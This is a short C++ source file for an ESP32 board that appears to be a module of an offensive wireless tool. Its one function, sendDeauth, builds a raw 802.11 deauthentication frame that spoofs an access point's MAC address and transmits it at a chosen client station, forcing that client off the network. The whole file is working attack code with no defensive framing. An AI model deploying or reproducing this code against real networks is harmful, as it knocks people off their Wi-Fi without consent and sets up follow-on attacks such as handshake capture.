#include "../wireless/wifi/wifi_deauth_sender.h"
#include <esp_wifi.h>

void sendDeauth(const WiFiDevice& ap, const WiFiDevice& sta) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    sta.mac[0], sta.mac[1], sta.mac[2], sta.mac[3], sta.mac[4], sta.mac[5],
    ap.mac[0], ap.mac[1], ap.mac[2], ap.mac[3], ap.mac[4], ap.mac[5],
    ap.mac[0], ap.mac[1], ap.mac[2], ap.mac[3], ap.mac[4], ap.mac[5],
    0x00, 0x00, 0x07, 0x00
  };
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}